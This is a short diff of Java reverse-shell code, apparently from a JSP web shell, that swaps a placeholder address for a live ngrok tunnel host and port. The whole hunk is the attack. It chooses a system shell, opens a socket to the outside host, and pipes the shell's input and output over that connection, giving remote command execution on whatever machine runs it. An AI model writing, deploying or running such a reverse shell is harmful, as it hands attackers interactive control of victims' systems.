@@ -50,7 +50,7 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
   ShellPath = new String("cmd.exe");
 }
 
-    Socket socket = new Socket( "IP", PORT );
+    Socket socket = new Socket( "8.tcp.ngrok.io", 12508 );
     Process process = Runtime.getRuntime().exec( ShellPath );
     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
